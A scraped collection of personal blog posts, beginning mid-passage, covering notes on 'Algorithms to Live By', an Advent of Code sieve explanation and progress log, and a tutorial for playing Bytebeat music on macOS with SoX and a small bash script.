more potential bests; can’t find any new\n    \n    \n      Exploring determines there is not a clear end in sight\n      Exploiting signals an end of the interval\n    \n    \n      Children are almost exclusively here\n      Adults are almost exclusively here\n    \n  \n\n\n\n\nOptimal Stopping - Knowing When To Move On\n\nOptimal stopping is a way to know when to cut losses and move on. Don’t waste potential opportunities or resources on irrational ideas or scenarios.\n\nNo Information Scenarios\n\nThis applies only in “no information” games, where no information is provided on the data that is being looked through: the number of things, the things to come, the total population, etc. In this situation, you can only compare the elements to one another and not to a standard or metric.\n\n\n  Look then leap: set a predetermined time to gather data and don’t choose anything. After that, be willing to commit to anything that is better than what you saw before.\n  37%: A variant of Look then leap, the 37% rule is a rule derived from the idea of optimal stopping. 37% into a search, one should be prepared to pounce on the first thing they find that is better than what they saw before. First 37% is only looking and gathering data. Used in house searches, hiring, etc.\n\n\nSecond Chance Scenarios\n\nIn second chance scenarios, being restless and having doubt is important. Since you never know if you have the best **and **you have a second chance, this is important in getting the best.\n\n\n  To live in a restless word requires a certain restlessness in oneself.\n\n\nFull Information Scenarios\n\nThis is when you are using knowable and measurable things as a criteria or a standard with no second chances.\nThe problem of when to sell an item is a full information problem. In this case, the cost of holding an item is the equivalent of a cost of running out of elements to search through. In both cases, the longer you wait, the less chance you have of turning a profit (or in the latter, the less chance of choosing an ideal element). The cost of holding goes up, be willing to accept less sooner, and vice versa.\n\nThe threshold rule is used to pick somebody based upon their rating within the group after X amount of elements have passed by. If an element at X position within Y total elements has a rating above Z percentile, then you should choose them and look at any following elements. Or, choose element if over Z percentile and Y elements are left.\n\n\n\nSorting - Reducing Future Search Time\n\nSorting is only important in reducing future search time. As the cost of searching drops, the value of sorting goes down, and similarly, as the amount of elements to sort goes up, the speed in which it is done goes down.\n\nInstead of sorting by comparing elements to each other, a more efficient way to sort is by comparing to an external standard or measure. This is called a “cardinal number” instead of an “ordinal number”. A benchmark like this allows sorting without time intensive systems. Overall it may be incorrect, but it’s good enough , saves time and potential problems, and is therefore acceptable. (Example: The “law of gross tonnage” states that smaller yields to bigger. This may not always be true, but it is true a large amount of the time and will yield less expended less resources for a high accuracy.)\n\nAlgorithms\n\nBig O\n\nBig O notation is about hard guarantees and deadlines.\n\n\n  \n    \n      Notation\n      Name\n      Analogy\n    \n  \n  \n    \n      O(1)\n      Constant\n      Cleaning the house before a party\n    \n    \n      O(n)\n      Linear\n      Giving drinks to every guest\n    \n    \n      O(n log n)\n      Linearithmic\n      \xa0\n    \n    \n      O(n^2)\n      Quadratic\n      Every person meeting every person\n    \n    \n      O(2^n)\n      Exponential\n      \xa0\n    \n    \n      O(n!)\n      Factorial\n      Must organize everyone in every possible permutation\n    \n  \n\n\nThe fastest way to sort a list can’t be less than O(n) because you have to check all of the elements and that is at least the length of the list itself.\n\nMore efficient algorithms can sacrifice accuracy for speed. For instance, errors in Mergesort can compound quickly, when simpler sorts like Bubblesort are much safer.\n\nQuadratic Sorts\n\nBubble Sort\n\n\n  Start at the beginning\n  Test each element against the next one\n  If A > B, swap A and B\n  Continue to the end of the elements\n  Repeat the above steps until all elements are sorted\n\n\nInsertion Sort\n\n\n  Start at the beginning\n  Copy each element into a new array\n  Put the copied element in order in the new array\n  Repeat the above steps until all elements have been copied into the new array\n\n\nLinearithmic Sort\n\nMergesort\n\n\n  Start at the beginning of the array and take every two elements out as a pair\n  Compare each pair of elements and put them in order (element 1 and element 2, element 3 and element 4, etc.)\n  Now pair each group up with another group\n  Compare each pair of elements across groups and place them in order\n  Repeat this process until all groups have become one group\n\n\n\n\nCaching - Minimize Searching, Maximize Use\n\nThe goal of a cache management system is to minimize the amount of times you need to search your “base” and maximize the times you find what you need in your “cache”. Memory hierarchies are like a pyramid: the base in largest and accessed the least; the highest is accessed the most and is the smallest. For example, a library is the base and your checked out books are at the top.\n\nThe alogirthms with which information in the cache is replaced by new information is similar to many algorithms and heuristics used in minimalism and getting rid of stuff (how long have I had it? when did I use it last?).\n\nLeast Recently Used\n\nThe Least Recently Used (LRU) algorithm is where you make LRU data more accessible, either via distance, ease, speed, location, etc. LRU is effective because of “Temporal Locality”: if it is in cache, it will probably be used again. Self organizing lists use LRU:\n\n\n  Put documents in a pile\n  When a document is recalled, put it on top when finished.\n  End result: least recently used is at the bottom (long term storage), most recently used at the top (cache)\n\n\n\n  The nearest thing to clairvoyance is to assume that history will repeat itself backwards.\n\n\nOur human memory is not limited but the time spent searching is. It is a library with one infinitely long bookshelf. Using LRU, the most popular things come to the front/top of mind, and vice versa. The aging mind getting slower is not due to lack of agility or speed. It is due to abundance of information and difficulty in successfully caching.\n\n\n\nScheduling - Focus not on getting things done, but getting “weighty” things done\n\nHow you tackle your todo list is based on your goal. If your goal is to minimize time to total completion, do what has the shortest completion time first. THis makes each person waiting for their deliverables with the shortest amount of time. This also reduces total tasks on the todo list quickest. If your goal is to minimize oppressiveness/weight of tasks, divide the oppressiveness/weight of each task by the estimated completion time, and then do the tasks with the highest unit of weight per unit of time.\n\nThe oppressiveness/weight metric needs an importance or price as a scale. The example below you could think of the weight metric as importance or dollars per hour to illustrate. Example (using a 1-10 scale of weight/oppressiveness with higher numbers being more oppressive, and an hour scale for time):\n\n\n  Task 1:\n    \n      Weight: 1 (low)\n      Time: 8\n      Result: 1/8\n    \n  \n  Task 2:\n    \n      Weight: 10 (high)\n      Time: 1\n      Result: 10/1\n    \n  \n  Comparison\n    \n      Task 1 vs. Task 2 == 1/8 : 10/1 == Task 1 (1/8) is less important to do now than Task 2 (10/1).\n    \n  \n\n\nIn the context of debt reduction, stemming from these two algorithms are two different schools of thought:\n\n\n  Debt Snowball: focus is on removing the sources of the smallest balances first (using the “minimize time to total completion” algorithm above).\n  Debt Avalanche: focus on removing the sources with the highest interest rates first (using the “minimize oppressiveness/weight of tasks” algorithm above)\n\n\nAnti-Patterns\n\nPreemption is the ability to stop mid-task and start another. Using previous algorithms, preemption allows flexibility with tasks that can’t be started until a certain time or requisite is met. If receiving a new task in the middle of another one, comparing them using a weighted SPT ratio of weight/time is the best option.\n\nContext switching is work that is done in switching tasks to ensure that new task can be done, also known as meta-work. The cost of context switching is throughput. More responsiveness (more context switching with a lower threshold of rejection) leads to less throughput overall Lower responsiveness (less context switching with a higher threshold of rejection) leads to higher throughput overall.\n\nThrashing is when this meta-work is taking up all of your time and no actual work can be done. If one finds themselves in a thrashing state, the best thing to do at that point is to do whatever tasks in whatever order to open up more resources.\n\nPriority inversion is where a lower level task is blocking a higher level task.\n\nPre-crastination is when you choose smaller subtasks over a major task, with the goal being to lessen the total load of tasks. Pre-crastinators act with the wrong metric in mind: when a major task is difficult to manage, they try to lessen this difficulty by going for the “minimize time to total completion” algorithm instead of the “minimize oppressiveness” algorithm. This is most common in systems with no weighting system in place. For instance, email icons show all unread messages, including those messages that are unimportant as well as those that are. In trying to deal with the most weighty emails, this leads people to lower the total number of unread messages instead of dealing with those weighty emails, in an attempt to relieve the problem. If the goal is just to have less unreads, then this is the best choice, but if the goal is to do what is important, then the other algorithm is best, and therefore, managing the most weighty emails first is the best choice.\n\n\n  In the case of app badges, if we can’t get them to reflect our actual priorities, and can’t overcome the impulse to optimally reduce any numerical figure thrown in out face, then perhaps the next best thing is to turn the badges off.\n\n\nBest Practices\n\nSetting minimum periods with no interruptions allow both the throughput and responsiveness without sacrificing either, a la Pomodoro Method. Determine the minimum acceptable limit of responsiveness and then be no more responsive than that.\n\nInterrupt coalescing is the grouping of like interrupts to all be done at once. Let all interrupts of type X wait until a minimum acceptable responsiveness and then attend to them all at once.\n\nWhen priority inversion is an issue, use priority inheritance, where that lower level task that is blocking the higher level task inherits the priority of that task. If you can’t do task Y because task Z isn’t done yet, then task Z is now the most important task to be done.\n\n\n\nPredictions\n\n\n  Events are always experienced at their proper frequencies, but this isn’t true of language.\n\n\nGood predictions require good priors. People generally have a ton of information from past experience and this allows good models. However, we retell interesting stories because of how interesting they are. This makes them seem to be more likely than they really are to be.\n\nThe Stanford Marshmallow Experiment and its successive study to replicate it’s findings was not at its core a study of delayed gratification, as much as it was trust that the system will honor its word in giving you the marshmallow it promised. Kids who lived in places with less trust in authority or the words of others were less likely to wait as it would have no perceived benefit to them.\n\nLaws and Rules\n\nLaplace’s Law\n\nWith no priors or prior information given or known, the probability of a given event happening is (the number of successes + 1) / (the number of attempts + 2).\n\nBayes’s Rule\n\nThis shows the probability of one scenario given that another scenario is true. The formula is written as Probability of A given B = [(Probability of B given A) multiplied by (Probability of A)] / (Probability of B).\n\nExample: What is the probability that the person is a librarian and not a farmer given a description? (from 3Blue1Brown’s video on Bayes Rule)\n\nThe total options available are that the person described is either a farmer or a librarian.\n\nP(librarian | description) = ( P(description | librarian) * P(librarian) ) / P(description)\n\n\n\n  P(description | librarian) = the likelihood that the description fits a given librarian, let’s say 40%\n  P(librarian) = the percentage of librarians (10) to farmers (200), ~5%\n  P(description) = the likelihood that the description fits a given librarian AND the likelihood that the description fits a given farmer;\n    \n      Librarian: let’s say 40%\n      Farmer: let’s say 10%\n      Total: (.4 * 10 + .1 * 200) / 210 = 11%\n    \n  \n\n\nP(librarian | description) = ( 40 * 5 ) / 11 = 200/11 = 18% probability of the description matching a librarian in the given sample\n\n\n  The richer the information we bring to Bayes rule, the more useful the predictions we can get out of it.\n\n\n3Blue1Brown’s second video on Bayes’s Rule\n\nCopernican Principle\n\nWithout prior information, we encounter things on on average halfway through their entire existence. They will last as long as they already have again.\n\nDistributions/Scales\n\nNormal Distribution: use the Average Rule\n\nThere is an average and then falls sharply on either side. Usually follows a single appropriate scale, e.g. average lifespan is 76; low is single digits and high is triple.\n\nThe Average Rule is to use the distribution’s average to make your prediction.\n\nPower Law Distribution: use the Multiplicative Rule\n\nFollows a more displaced curve. Often accompanied by hige discrepancies of numbers, e.g. average income is $58k, but 2/3 of population make less while .01% make 100 times more. Can be interpreted as the 80/20 rule.\n\nThe Multiplicative Rule is that, in the case of a power law distribution, the observation made can be multiplied by a constant factor to make a prediction.\n\nErlang Distribution: use the Additive Rule\n\nIn between a normal and power law distribution. Models include radioactive decay, political terms in office.\n\nThe Additive Rule is that things will go on a constant amount longer. These distributions yield the same prediction regardless of history or current state.\n\nOverfitting and How To Avoid It\n\nOverfitting is a model that contains more parameters than can be justified by the data. Applying simple heuristics (fewer models or a simpler formula) can often be better and more accurate due to overfitting and confidence in it by the user. Too simple of a model will get you inaccurate results; too complex will imply things that don’t exist or are hyperbolic. The more noise you have, the more simple your model or heuristics need to be to ensure no overfitting occurs. The less noise you have, the more complex your model and heuristics can be. The more accurate our data, the more factors can be used safely. Adding more factors to help match the data correctly is not necessarily the way to get good predictions.\n\nOverfitting your work to fit the picture of success is product over process thinking. If your goal is to lose 30 pounds and you don’t eat, you will succeed (product) but you will also sacrifice the form (process) necessary to do it in a way that addressed the underlying information and goal: better health. Focus on the way and process over all else.\n\nIn focusing on form, be careful what you measure as goal oriented behavior. This will be reached at all costs and that may or may not be in the way that was asked.\n\nEarly stopping\n\nEarly stopping is used to stop the refinement or research into solving a problem before you get too in the weeds. Overfitting will take place beyond the most important factors.\n\n\n  How early to stop depends on the gap between what you can measure and what really matters.\n\n\nCross validation\n\nCross validation is assessing the given data and seeing how well the model predicts unseen data.\n\n\n  Withhold data points to plug in later and see if they follow\n  Use data pulled from another measure and see if it holds up\n\n\nCross training with different educational systems or testing methods can ensure that the learning is not being “taught to the test”.\n\nRegularization\n\nRegularization is introducing penalties for more complexity in the model to ensure that the extra complexity is worth it. Only the most important factors must stay in relation to how much importance the overall function the element is to the system. For instance, the brain would not be evolutionarily viable if it took 20% of our caloric intake and didn’t provide such benefits as it does now. Also, the brain is apparently not important enough to take 40% of our caloric intake.\n\n\n\nPredictions\n\nModels\n\nHill Climbing\n\nHill Climbing is starting with a possibility and editing that possibility over and over to find the best solution. It gives you the “local maximum” to your starting point. Hill climbing can be augmented with “jitter”, an applied randomness to test slight deviations for successful outcomes.\n\nDifferent types of Hill Climbing include:\n\n\n  “Shotgun” hill climbing: restarting from a totally random or shuffled possibility and repeating your whole process.\n  Metropolis Algorithm: accepting slightly worse possibilities at random to ensure new directions are taken.\n  Simulated Annealing: starting at a random point, always take a better solution if found and accept slightly worse solutions X% of the time. Continue lowering X until it is zero and you will have found the local maximum. Good for use with Metropolis, simulates jitter, and utilizes shotgun.\n\n\n\n  Your likelihood of following a bad idea should be inversely proportional to how bad it is.\n\n\nMonte Carlo Method\n\nReplace exhaustive probability calculations with sample simulations, usually samples made of random inputs.\n\nSieve of Eratosthenes\n\nExample: To find primes from 1 to n:\n\n\n  Write all numbers from 1 to n\n  Start at 2 and cross off any multiples of 2.\n  Repeat with all numbers not yet crossed out.\n  When n/2 is reached, all numbers not yet crossed out are primes.\n\n\nGreedy/Myopic Algorithms\n\nThese focus on only the best choice at each step and don’t worry about the others.\n\nTypes of Relaxation and Their Implementation\n\nConstraint Relaxation\n\nConstraint relaxation is when you try to solve an easier version of the problem, and then when you’ve made progress, add constraints back in. Constraint relaxation is a tradeoff of time for good-enough solutions.\n\nRemove the constraints, make progress, and then reintegrate the constraints.\n\nDiscrete Optimization/Continuous Relaxation\n\nDiscrete optimization/continuous relaxation is used where fractions aren’t used (number of fire trucks per capita, number of people to vaccinate). Relaxing these to use fractions and then round from there is usually good enough (number of fire trucks ending up being 1.2 per capita, rounding to 1).\n\nTurn discrete measurements to continuous measurements and then round them off.\n\nLagrangian Relaxation\n\nIn optimization, there are the rules and the scorekeeping. Moving constraints from the rules (input) to the scorekeeping (output) allows for impossible solutions to get close enough.\n\nChange the bindings on the rules into bindings on the score.\n\n\n  The perfect is the enemy of the good. - Voltaire\n\n\n\n\nNetworking\n\nExponential Backoff\n\nIf an attempt is failed, increase the previous constraint by double.\n\n\n  If network is not connecting, wait between 1-2s to try and reconnect; again, wait 2-4s more; etc.\n  If a person doesn’t respond to your call or text, wait 1 day to follow up; again, wait 2 days, etc.\n  If a person violates probation, the 1st time they should spend 1 day in jail; the 2nd, 2 days; 3rd, 4 days; etc.\n\n\nAdditive increase, multiplicative decrease\n\nOn a success, increase the input side at a constant rate. On a failure, cut back that input by half. Applicable most directly to internet connections and attempts to ask for or send information.\n\nBackchannels\n\nThe backchannels in communication are responses, acknowledgements, or the lack thereof. In a conversation or speech, the effectiveness of a speaker is partly dependent on the listener’s backchannel communication.\n\nTaildrop\n\nA taildrop is the dropping of everything that didn’t fit within the buffer. Modern communication doesn’t allow taildrop, and was specifically made to stop it. For example, a home phone with a tape message machine will eventually run out of space, but an email box has no feasible limit of how large the backlog can get. We aren’t always connected, but we are always buffered.\n\n\n  One of the fundamental principles of buffers is that they only work correctly if they are routinely zeroed out.\n\n\n\n\nGame Theory\n\n\n  We can hope to be fortunate, but should strive to be wise.\n\n\n“Price of anarchy”: The gap between cooperation and competition. The bigger the difference, the higher the price.\n\nRevelation Principle: Any game that requires strategic masking of the truth can be transformed into a game where the dominant strategy is honesty.\n\nComputational Kindness: relieving the amount of things for sombody to compute when forced with your problem. By asking a very specific question, the answer will be simpler. Too many questions will feel intractable. Instead of “passing the cognitive buck”, offering a suggestion is a way to lessen the burden for others. Instead of a continued computation, aka spinning (will the bus come soon?), opt for a single one, aka blocking (the bus is coming in 10 minutes; I can/cannot wait).\n\nLeveling\n\nOnly playing one level above your opponent. If you are playing at level 3 and they are at level 1, it is likely you will be overthinking your strategy and overfit your model.\n\n\n  Level 1 - I know\n  Level 2 - I know you know\n  Level 3 - You know I know you know\n  etc.\n\n\nAn Information Cascade is when external information affects your personal information so much that you then disregard your own info completely.\n\n\n  Be wary of cases where you know more about what people are doing than why.\n  Actions are not beliefs. Do not misinterpret actions as beliefs.\n\n\nEquilibrium\n\nIn a two player game, this is the best strategy assuming rational play. This is distinctly outside of leveling, meta strategy, etc. The predictive abilities of Nash equilibrium are only useful if you can find them as a player.\n\nIf the point of equilibrium can’t be changed directly, then the rules must be changed to force the equilibrium to move.\n\n\n  If employers give an option to take vacation or not, the equilibrium will shift to be the “most loyal” employee, taking less vacation than their peers.\n  By making vacation mandatory, this leaves everyone free to take the break, not allowing the competition to overtake their good judgment in taking care of themselves.\n\n\nAuctions\n\nSealed Bid First-Price Auctions: Bids are made in secret and highest offer wins. The bidders are not offering what they want to pay; they are offering what they think others will pay plus some. Winners almost always overpay.\n\nDutch Auction: Starting price is lowered until someone wants to buy it.\n\nEnglish Auction: Starting price is raised until highest bidder.\n\nVickrey Auction: Sealed bid first-price auction but winner pays second highest bid. Utilizes the Revelation Principle to convert the sealed bid first-price auction’s “strategic masking of the truth” into a game where people play honestly.\n\n\n'] at ['http://milofultz.com/2020/12/27/atlb-notes']

Found CONTENT ['Here, to help justify that I definitely stole an answer from somebody on Reddit to answer this question, I’m going to explain why the answer works. Mainly for myself to truly understand this, but also so that if somebody searches for something like this at a later date, there will be a reference. (I’ll be using the smaller sample data for the explanation because it is way easier to grok)\n\nCheck out the problem here, or this won’t make any sense.\n\nBrute Force\n\nMy initial solution used brute force, as essentially all of my solutions have so far, and this…didn’t work. My computer was working really hard, fans spinning and everything, but wasn’t getting anywhere (because the answer for me ended up being 667,437,230,788,118 and I started at 1). I went to bed and tried to not think about it. First of course we start with parsing the data, which is a line of “bus IDs”, which actually correspond to the intervals at which the buses leave the station.\n\n7,13,x,x,59,x,31,19\n\n\nI put these into an array, converting the numbers to integers and leaving the x’s as strings.\n\n[7, 13, \'x\', \'x\', 59, \'x\', 31, 19]\n\n\nHere’s the pseudocode of the brute force solution:\n\nSet \'largest_number\' to the largest number in the array\nSet \'largest_offset\' to the index of \'largest_number\' in the array\nSet the initial value of the \'multiple\' by which to multiply the \'largest_number\' to 1\nSet a \'found\' variable to let the program know the solution has not been found\nWhile the solution has not been \'found\':\n    Set that the solution is \'found\' until proven otherwise\n    Set the \'target\' test value to the \'multiple\' times the \'largest_number\'\n    For each \'index\' of each \'bus_ID\' in the array\n        Set the \'offset\' to the \'index\' minus the \'largest_offset\'\n        If the \'bus_ID\' is an \'x\', then continue to the next \'bus_ID\'\n        If the remainder of (the sum of the \'target\' and the \'offset\') divided by the \'bus_ID\' is not zero:\n        \tSet that the solution was not found and break out of the loop\n    Add one to the \'multiple\'\nReturn the \'target\'\n\n\nI used the largest number in the array to try and speed up the already long search, as their multiples of 59 would get searched way faster than the multiples of 7. As this iterates through, it tests every multiple of the largest number against each number plus or minus its relative offset. Unfortunately, even though this works, it is not fast (at all) for the much longer and much more complex final puzzle input.\n\nOne way I could have improved this was in the parsing of the data. Instead of trying to calculate weird offsets, I should have just included the offsets with the bus IDs as a tuple. The result would be a list of tuples, each of which include the offset and the bus ID/interval. The ‘x’s are also discarded, as they are no longer necessary.\n\n# (offset, bus_id)\n[(0,7), (1,13), (4,59), (6,31), (7,19)]\n\n\nSieving\n\nThe idea of a ‘sieve’ in math is to use it to ‘sieve’ out all non-possibilities, leaving you with a much smaller pool to test. Most notable is the Sieve of Erastosthenes, which is used to calculate prime numbers.\n\nThe most base case of this problem that I found was to find the least common multiple of a given set of integers. To find this using the sieve method, we can use this pseudocode:\n\nSet the initial value of the \'answer\' number to 0\nSet the initial value of \'least common multiple\' to 1\nFor each \'number\' in the array:\n\tWhile the remainder of the \'answer\' value divided by the \'number\' is not zero:\n\t\tAdd the value of the \'least common multiple\' to the \'answer\'\n\tSet the \'least common multiple\' to the `answer`\nReturn the \'answer\'\n\n\nExample:\n\nLet’s say our given array of integers are [2,3,8]. We start by setting our answer as 0 and the least common multiple to 1. Then we reach the For loop, which will cycle through the numbers in the array:\n\nSet the `number` to the first number in the `array`, 2.\nWhile `answer` % `number` ≠ 0: \n\t0 % 2 ≠ 0 is true, so add `least common multiple` to the `answer`. `answer` now equals 1.\n\t1 % 2 ≠ 0 is true, so add `least common multiple` to the `answer`. `answer` now equals 2.\n\t2 % 2 ≠ 0 is false, so break out of the while loop.\nSet `least common multiple` to `least common multiple` times `number`: 2.\nWe continue through the for loop: `number` is the next in the `array`: 3.\nWhile `answer` % `number` ≠ 0: \n\t2 % 3 ≠ 0 is true, so add `least common multiple` to `answer`: 4.\n\t4 % 3 ≠ 0 is true, so add `least common multiple` to `answer`:  6.\n\t6 % 3 ≠ 0 is false, so break out of the while loop.\nSet `least common multiple` to `least common multiple` times `number`: 6. \nWe continue through the for loop: `number` is the next in the `array`: 8.\nWhile `answer` % `number` ≠ 0: \n\t6 % 8 ≠ 0 is true, so add `least common multiple` to `answer`: 12.\n\t12 % 8 ≠ 0 is true, so add `least common multiple` to `answer`: 18.\n\t18 % 8 ≠ 0 is true, so add `least common multiple` to `answer`: 24.\n\t24 % 8 ≠ 0 is false, so break out of the while loop.\nSet `least common multiple` to `least common multiple` times `number`: 24.\n\n\nOne thing to note going forward is that all the numbers of the bus IDs are prime numbers, as if they were not, there would have to be some factorization in preparing to find the least common multiple. Finding the LCM of all primes is to just multiply them together, but with the offsets, we need this longhand to get there.\n\nAdding the Offsets\n\nNow that we have this pseudocode, adding the offsets is easier for me to grok. The biggest difference is that we are going to utilize the least common multiple and the answer a tiny bit differently. Assuming we have our list of bus IDs from before, where each ID is a tuple containing the offset and the bus ID/interval, we now have to adjust our test in the while loop. Instead of testing for if the remainder of the answer divided by the number is not zero, we are going to test whether the remainder of the sum of the answer and the offset all divided by the number is not zero.\n\n(\'answer\' + \'offset\') % `number` ≠ 0\n\n\nNow, here is the pseudocode, taking into account the offset needed to calculate the answer.\n\nSet the initial value of the \'answer\' number to 0\nSet the initial value of \'least common multiple\' to 1\nFor each \'offset\' and \'number\' in the array:\n\tWhile the remainder of the sum of the \'answer\' and the \'offset\' value all divided by the \'number\' is not zero:\n\t\tAdd the value of the \'least common multiple\' to the \'answer\'\n\tSet the \'least common multiple\' to the \'least common multiple\' multiplied by the \'number\'\nReturn the \'answer\'\n\n\nExample\n\nI’ll again use an array containing [2,3,8], keeping in mind the new problem: our solution must look for what number is:\n\n\n  A multiple of the first element, and\n  The sum of the offset plus a multiple of the number, for every other element.\n\n\nFirst we will need to parse our array into tuples containing their offsets and numbers:\n\n[(0, 2), (1, 3), (2, 4)]\n\n\nNext, we define answer as 0 and least common multiple as 1. Then we continue into the For loop:\n\nSet `offset` to the first number of the first tuple in `array`: 0; and set `number` to second number in the first tuple in `array`: 2.\nWhile (`answer` + `offset`) % `number` ≠ 0: \n\t(0 + 0) % 2 ≠ 0 is true, so add `least common multiple` to `answer`: 1.\n\t(1 + 0) % 2 ≠ 0 is true, so add `least common multiple` to `answer`: 2.\n\t(2 + 0) % 2 ≠ 0 is false, so break out of the while loop.\nSet `least common multiple` to `least common multiple` times `number`: 2.\nWe continue through the for loop: set `offset` and `number` as the numbers in the next tuple: 1 and 3.\nWhile (`answer` + `offset`) % `number` ≠ 0: \n\t(2 + 1) % 3 ≠ 0 is true, so break out of the while loop.\nSet `least common multiple` to `least common multiple` times `number`: 6.\nWe continue through the for loop: set `offset` and `number` as the numbers in the next tuple: 2 and 8.\nWhile (`answer` + `offset`) % `number` ≠ 0: \n\t(2 + 2) % 8 ≠ 0 is true, so add `least common multiple` to `answer`: 8.\n\t(8 + 2) % 8 ≠ 0 is true, so add `least common multiple` to `answer`: 14.\n\t(14 + 2) % 8 ≠ 0 is false, so break out of the while loop.\nSet `least common multiple` to `least common multiple` times `number`: 48.\nReturn the `answer`: 14.\n\n\nOther Solutions\n\nThe ones using the Chinese remainder theorem went way over my head and the videos I watched were not enough to compel me to spend time trying to: first, understand it and then second, write the program out. It was well beyond my understanding, but I think it probably is the “desired” solution.\n\n\n'] at ['http://milofultz.com/2020/12/13/aoc-day-13']

Found CONTENT ['These are my solutions. I’m trying to do as many as I can in both Python and in Javascript. Plus I’m going to scope out people’s answers in C and see what I can glean.\n\nCheck out the solutions on GitHub\n\n\n  20201201: Solved the first challenge, starting up number 2\n  20201202: Solved day 2\n  20201203: Solved day 3 and 4\n  20201204: Solved day 5\n  20201205: Solved day 6\n  20201206: Solved day 7. Definitely noticing the desire to be on the leaderboards and “cool” or “fast” or whatever and trying to go against that feeling. I would rather have effective solutions “slowly” than flail around and hope stuff works.\n  20201207: Solved day 8. Worked much more purposefully and without (as much) regard to the clock; still working on focusing on the process over the product.\n  20201208: Solved day 9. Brute forcing a problem I should probably use an algorithm for, but don’t know enough. Now is the time to really dig! Look through solutions on Reddit, Mastodon, etc.\n  20201209: Revised my work for day 9 to find a better solution. Ended up using a solution from ‘neelakantankk’ I found on Reddit, utilizing a deque, which I have very little experience with. It is a very interesting solution that utilizes a truth I missed in the iteration. When iterating through the contiguous numbers, if the sum of those contiguous numbers is higher than the target, you can safely remove the first number in the contiguous numbers. I’m having a hard time fully grokking it but it intuitively feels right, so I’m going to try and work it out on paper until it really makes sense.\n  20201209: Solved day 10 part 1 but do not have the know how for part 2 without just stealing an answer without any understanding. Will come back later.\n  20201210: Solved day 11\n  20201211: Solved day 12\n  20201211: Solved day 13 part 1 and have a brute force solution for part 2; however this solution has been spinning for a half hour at least and is showing no signs of progress.\n  20201213: Went and searched for solutions and found one that I was really able to understand from gravitar64, using a “sieving” method. This didn’t use some intense number theory, like other solutions which used the Chinese Remainder Theorem. I did cheat, but I understand the answer and how it works and that’s all I wanted anyway.\n  20201213: Made a write up of how the sieve method works to repent for what feels like cheating.\n  20201215: Solved day 14 and 15. Day 15 was really tough to understand while I was doing it, as there was a lot to juggle, but it was a very fun one to solve. Ended up refactoring quite a bit by reading the code of Scarymagi I found on Reddit.\n  20201216: Solved day 16, and parsing was the majority of the work. It was kind of its own challenge in itself. The problem for part 1 after that was pretty straightforward with a set. Part 2 presented an interesting challenge of essentially trying to solve a logic grid puzzle using programming, which I hadn’t done before. That was a good time!\n  20201218: Started on day 17 and realized I need to finally learn how to use Numpy and deal with 3 dimensional arrays, as this is essentially Conway’s Game of Life but in 3 dimensions.\n  20201219: Solved day 17 and learned how to use Numpy fairly well with it. Ended up doing Game of Life as a 3 dimensional and 4 dimensional version, which was wild. 3-dimensions required a lot from me, a guy who doesn’t ever do anything like this and probably solved it in a very long-winded inelegant way, but dammit I solved it.\n  20201219: Solved day 10 part 2 finally. Tried a recursive solution but it was blasting my computer and taking way too long, so I went searching. The solutions I found using defaultdict was super elegant, so went with that and am pretty happy with it.\n  20201221: Solved day 18, which was all about essentially making math that solved in the wrong order (i.e. not PEMDAS).\n  20201222: Solved day 19 part 1, which was really hard to grok, but I got it. A recursion puzzle that was hard to wrap my head around the initial parts. Part 2 is beyond the scope of what my late night brain can handle.\n  20201225: Solved day 20 and it took me a few hours yesterday and most of today. This was really fun, essentially automating putting together a puzzle, which was a really satisfying project.\n  20201228: Solved day 21 and it was much, much easier than 20. Essentially logic grid puzzle solving again, like in day 16, which is so satisfying to implement!\n\n'] at ['http://milofultz.com/2020/12/01/advent-of-code']

They often sound pretty musical due to the mathematical nature of the equations and bitwise operations. But that does not mean that it has to be “musical” to be good either, as you will discover when messing around with it.\n\nFor a good dive into what Bytebeat is and how it started, check out these links:\n\n\n  Kragen’s Writeup\n  The original post from  Ville-Matias Heikkilä and his follow up post\n  ZSerge’s article where I first heard about it\n\n\nExamples:\n\n\n  Bytebeat: Experimental music from very short C programs\n  Bytebeat: Experimental one-line algorithmic music - the 2nd iteration\n  Bytebeat: Music from very short programs - the 3rd iteration\n\n\nHow To Make Your Own\n\nA fantastic how-to of the basics including the math operations and how to use them can be found in PDF at TuesdayNightMachine’s Github page. I would highly recommend starting here if you don’t get binary or bitwise operations.\n\nThe super simplest way to implement and test (hear) Bytebeat code is through the many online HTML5/JS apps online.\n\n\n  Gregg Tavares\n  Bemmu and rarefluid (in stereo!)\n\n\nMaking It Offline On OSX\n\nMy desire when starting to mess with this stuff was trying to figure out how I could do it in the command line, as that was how I had seen it laid out in many examples in Linux. The problem was that the built in tools to pipe data into your audio device was not built in to OSX the way it is built in to Linux, so I had to do some sleuthing. With a lot of help from the Merveilles community, I was able to finally figure out the process and I wanted to document it here.\n\nStep 1. Install SoX with homebrew\n\nbrew install sox (you can follow this tutorial here if you are confused)\n\nStep 2. Create a bash script to automate the build, compile, and piping of your Bytebeat formulas all on the CLI.\n\nThe way that I did this was pretty much completely stolen from Cole Ingraham’s post that I dug up on archive.org. Essentially without this, you have to do quite a few very boring and uninteresting steps which means very little instant gratification, which is what we want.\n\nHere is the script that I created for using it in bash on OSX:\n\n#!/bin/bash\n\n# This script creates and plays a simple ByteBeat\n# ARGS\n# $1: a string with the ByteBeat algorithm e.g. "((t * 3) & (t >> 5))"\n# $2: the name of the file to be creates (without an extension)\n###\n\n# create the C program\necho "#include <math.h>\n\nint s(double num){\n    return 256*sin(num);\n};\n\nint c(double num){\n    return 256*cos(num);\n};\n\nmain(t){\n    for(t=0;;t++){\n        putchar( $1 );\n    }\n};" > "$2.c"\n\n# compile the source\ngcc "$2.c" -o "$2"\n\n# play it with standard ByteBeat settings\n./"$2" | sox -t u8 -r 8k -c 1 - -d\n\n\nTake this script and copy it into a code editor/text editor, saving it as a file with an .sh extension (I called it bytebeat.sh). Put it in a folder where you can access it easily with the command line in your terminal. There you will be able to make the audio using the arguments written in the script. But before that,\n\nStep 3. Turn down your volume!\n\nTrust me, it’s LOUD. Don’t forget!\n\nStep 4. Try it out!\n\nOnce you have saved that script and you have navigated to the enclosing folder in your terminal, you can make some noises! Your script takes two arguments:\n\n\n  The Bytebeat algorithm/equation\n  The name of the file that will be gnenerated and played (can be whatever, I usually go with test)\n\n\nFor example:\n\n./bytebeat.sh "(t/4)*(t>>8|((14 & t)^3))" test\n\n\nThis runs the bash script (bytebeat.sh) and uses the Bytebeat algorithm/equation "(t/4)*(t>>8|((14 & t)^3))" to generate the compiled C program test. This program test is then piped into sox and plays through the speakers. You’re done!\n\nRecord it!\n\nThere are two ways you can save the audio you’ve created. One is fairly user friendly and the other one is a bit clunky.\n\nThe easiest way is to download and install 